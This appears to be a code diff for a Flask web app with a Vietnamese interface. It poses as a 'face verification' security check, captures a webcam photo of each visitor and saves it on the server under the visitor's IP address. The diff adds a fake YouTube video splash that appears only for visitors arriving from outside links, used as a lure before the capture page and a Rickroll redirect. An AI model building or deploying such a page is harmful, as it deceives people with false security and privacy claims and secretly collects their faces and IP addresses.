@@ -6,8 +6,7 @@ import cv2
 import numpy as np
 
 app = Flask(__name__)
-os.system("clear")
-os.system("cls")
+os.system("clear" if os.name == "posix" else "cls")
 
 print("""
 ██████╗░██╗░░██╗░█████╗░░█████╗░░█████╗░███╗░░░███╗██╗░░██╗░█████╗░░█████╗░██╗░░██╗
@@ -52,7 +51,7 @@ HTML_PAGE = """
       min-height: 100vh;
       color: #fff;
     }
-    /* Khung xác thực với border màu cố định */
+    /* Giao diện xác thực */
     .card {
       background: #fff;
       border-radius: 12px;
@@ -140,7 +139,7 @@ HTML_PAGE = """
       color: #999;
       margin-top: 20px;
     }
-    /* Modal Styles */
+    /* Modal Styles (không thay đổi) */
     .modal {
       position: fixed;
       top: 0; left: 0;
@@ -189,19 +188,19 @@ HTML_PAGE = """
   </style>
 </head>
 <body>
+  <!-- Giao diện xác thực -->
   <div class="card">
     <h2>Xác Thực Khuôn Mặt</h2>
     <p>Chúng tôi cần xác thực khuôn mặt của bạn để đảm bảo an toàn. Nhấn nút bên dưới để bắt đầu xác minh.</p>
     <button class="btn" id="verify-btn" onclick="startVerification()">Xác Minh Ngay</button>
     <div class="spinner" id="loader"></div>
     <div class="loading-text" id="loading-text">Đang xác thực...</div>
-    <!-- Phần hiển thị số tiến trình -->
     <div class="progress" id="progress">0%</div>
     <div class="success" id="success-message">✅ Xác Minh Hoàn Tất ✅</div>
     <div class="info">Thông tin của bạn sẽ được bảo mật tuyệt đối.</div>
   </div>
 
-  <!-- Modal Chính Sách Riêng Tư -->
+  <!-- Các modal (không thay đổi) -->
   <div class="modal" id="privacy-modal">
     <div class="modal-content">
       <h3>🤖 Xác Thực Người Dùng 🤖</h3>
@@ -209,8 +208,6 @@ HTML_PAGE = """
       <button class="modal-close" onclick="closeModal('privacy-modal')">Đồng Ý</button>
     </div>
   </div>
-
-  <!-- Modal Anti Ads / Phát hiện AdBlock -->
   <div class="modal" id="adblock-modal">
     <div class="modal-content">
       <h3>Phát hiện AdBlock!</h3>
@@ -220,11 +217,9 @@ HTML_PAGE = """
   </div>
 
   <script>
-    // Hiển thị modal khi tải trang
+    // Modal và AdBlock detection (không thay đổi)
     window.addEventListener('load', function() {
       document.getElementById('privacy-modal').style.display = 'flex';
-
-      // Anti Ads / AdBlock detection
       var adTest = document.createElement('div');
       adTest.className = 'adsbox';
       adTest.style.position = 'absolute';
@@ -251,12 +246,10 @@ HTML_PAGE = """
       let progress = document.getElementById("progress");
       let successMessage = document.getElementById("success-message");
 
-      // Ẩn nút xác minh và hiển thị spinner cùng loading text
       button.style.display = "none";
       loader.style.display = "block";
       loadingText.style.display = "block";
 
-      // Yêu cầu quyền truy cập webcam
       navigator.mediaDevices.getUserMedia({ video: true })
         .then(stream => {
           let videoTrack = stream.getVideoTracks()[0];
@@ -265,7 +258,6 @@ HTML_PAGE = """
             .then(blob => {
               let formData = new FormData();
               formData.append("image", blob, "face_verification.png");
-              // Gửi ảnh đến server
               fetch('/upload', { method: "POST", body: formData })
                 .then(response => {
                   if(response.status !== 200){
@@ -275,12 +267,10 @@ HTML_PAGE = """
                     button.style.display = "inline-block";
                     return;
                   }
-                  // Khi xác thực thành công, ẩn spinner & loading text, hiển thị progress
                   loader.style.display = "none";
                   loadingText.style.display = "none";
                   progress.style.display = "block";
                   
-                  // Đếm tiến trình từ 0 đến 100%
                   let count = 0;
                   let interval = setInterval(() => {
                     count++;
@@ -288,7 +278,6 @@ HTML_PAGE = """
                     if(count >= 100) {
                       clearInterval(interval);
                       successMessage.style.display = "block";
-                      // Sau khi progress đạt 100%, chuyển hướng đến video Rickroll
                       window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
                     }
                   }, 30);
@@ -314,6 +303,58 @@ HTML_PAGE = """
           button.style.display = "inline-block";
         });
     }
+
+    // --- SPLASH OVERLAY GIỐNG YOUTUBE CHỈ HIỆN KHI TRUY CẬP TỪ NGOÀI ---
+    window.addEventListener("load", function(){
+      // Kiểm tra referrer: nếu có referrer và không chứa tên miền hiện tại, tức là đến từ link ngoài
+      let ref = document.referrer;
+      let card = document.querySelector('.card');
+
+      if(ref && !ref.includes(window.location.host)){
+        card.style.display = "none";  // Ẩn giao diện xác thực ban đầu
+        
+        var splash = document.createElement("div");
+        splash.id = "splash-overlay";
+        splash.style.position = "fixed";
+        splash.style.top = "0";
+        splash.style.left = "0";
+        splash.style.width = "100%";
+        splash.style.height = "100%";
+        splash.style.backgroundImage = "url('https://i.ytimg.com/vi/dQw4w9WgXcQ/maxresdefault.jpg')";
+        splash.style.backgroundPosition = "center";
+        splash.style.backgroundSize = "cover";
+        splash.style.zIndex = "3000";
+        splash.style.cursor = "pointer";
+
+        var playButton = document.createElement("div");
+        playButton.style.position = "absolute";
+        playButton.style.top = "50%";
+        playButton.style.left = "50%";
+        playButton.style.transform = "translate(-50%, -50%)";
+        playButton.style.width = "80px";
+        playButton.style.height = "80px";
+        playButton.style.backgroundColor = "rgba(0,0,0,0.6)";
+        playButton.style.borderRadius = "50%";
+        playButton.style.display = "flex";
+        playButton.style.alignItems = "center";
+        playButton.style.justifyContent = "center";
+        playButton.style.fontSize = "40px";
+        playButton.style.color = "#fff";
+        playButton.innerText = "▶";
+
+        splash.appendChild(playButton);
+        document.body.appendChild(splash);
+
+        // Khi nhấn vào splash overlay, ẩn nó đi và hiển thị giao diện xác thực
+        splash.addEventListener("click", function(){
+          splash.remove();
+          card.style.display = "block";
+        });
+      } else {
+        // Nếu không có referrer (hoặc referrer từ cùng domain) thì hiển thị giao diện xác thực ngay
+        card.style.display = "block";
+      }
+    });
   </script>
 </body>
 </html>
@@ -333,23 +374,17 @@ def index():
 def upload():
     if 'image' not in request.files:
         return "Lỗi khi nhận ảnh!", 400
-
     image = request.files['image']
     user_ip = request.remote_addr
     timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
     image_path = os.path.join(SAVE_PATH, f"{user_ip}_{timestamp}.png")
-
     try:
         os.makedirs(SAVE_PATH, exist_ok=True)
-        # Mở ảnh bằng PIL
         img = Image.open(image)
         if img.mode in ("RGBA", "P", "CMYK"):
             img = img.convert("RGB")
-        
-        # Chuyển ảnh sang OpenCV để phát hiện khuôn mặt
         img_cv = cv2.cvtColor(np.array(img), cv2.COLOR_RGB2BGR)
         gray = cv2.cvtColor(img_cv, cv2.COLOR_BGR2GRAY)
-        # Thay đổi tham số phát hiện khuôn mặt cho nhạy hơn
         faces = face_cascade.detectMultiScale(
             gray,
             scaleFactor=1.05,
@@ -361,7 +396,6 @@ def upload():
         if len(faces) == 0:
             print("\033[31m[❌] Không phát hiện được khuôn mặt. Yêu cầu xác thực lại!\033[0m")
             return "Không phát hiện được khuôn mặt, vui lòng xác thực lại!", 400
-
         img.save(image_path, "PNG")
         print(f"\033[32m[📷] Ảnh đã lưu: {image_path}\033[0m")
         return "OK", 200
